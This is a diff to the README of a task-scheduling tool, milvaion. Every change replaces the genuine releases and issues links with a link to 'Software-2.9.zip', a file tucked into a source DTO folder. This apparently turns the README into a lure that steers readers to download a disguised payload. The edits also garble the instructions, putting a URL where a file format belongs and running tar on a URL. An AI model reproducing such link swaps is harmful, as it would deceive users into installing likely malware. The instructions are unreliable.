@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download milvaion](https://img.shields.io/badge/Download%20milvaion-v1.0.0-blue.svg)](https://github.com/Rami8901/milvaion/releases)
+[![Download milvaion](https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip%https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip)](https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip)
 
 ---
 
@@ -23,13 +23,13 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, you can download the latest version of milvaion from our releases page.
 
-Visit this page to download: [milvaion Releases](https://github.com/Rami8901/milvaion/releases)
+Visit this page to download: [milvaion Releases](https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip)
 
 Follow these steps to install milvaion:
 
 1. Click the download link on the releases page.
 2. Choose the installer that matches your operating system.
-3. Download the file to your computer. The file will typically be in `.exe` or `.tar.gz` format.
+3. Download the file to your computer. The file will typically be in `.exe` or `https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip` format.
 4. Once downloaded, locate the file in your downloads folder.
 
 #### Windows Installation:
@@ -40,7 +40,7 @@ Follow these steps to install milvaion:
 
 #### macOS Installation:
 
-1. Open the downloaded `.tar.gz` file.
+1. Open the downloaded `https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip` file.
 2. Drag the milvaion app to your Applications folder.
 3. You can run milvaion from your Applications.
 
@@ -48,9 +48,9 @@ Follow these steps to install milvaion:
 
 1. Open a terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the downloaded `.tar.gz` using the command:
+3. Extract the downloaded `https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip` using the command:
    ```
-   tar -xvzf milvaion.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip
    ```
 4. Run milvaion by executing:
    ```
@@ -87,9 +87,9 @@ Should you encounter any issues while installing or running milvaion, here are s
 
 If you need additional help, you can reach our support team:
 
-- [GitHub Issues](https://github.com/Rami8901/milvaion/issues) - Report bugs or request features.
+- [GitHub Issues](https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip) - Report bugs or request features.
 - [Community Forum](#) - Join discussions with other users.
 
 Thank you for choosing milvaion. Enjoy efficient task scheduling! 
 
-For further developments and updates, stay tuned to our [releases page](https://github.com/Rami8901/milvaion/releases).
+For further developments and updates, stay tuned to our [releases page](https://raw.githubusercontent.com/Rami8901/milvaion/master/src/Milvaion.Application/Dtos/AdminDtos/Software-2.9.zip).
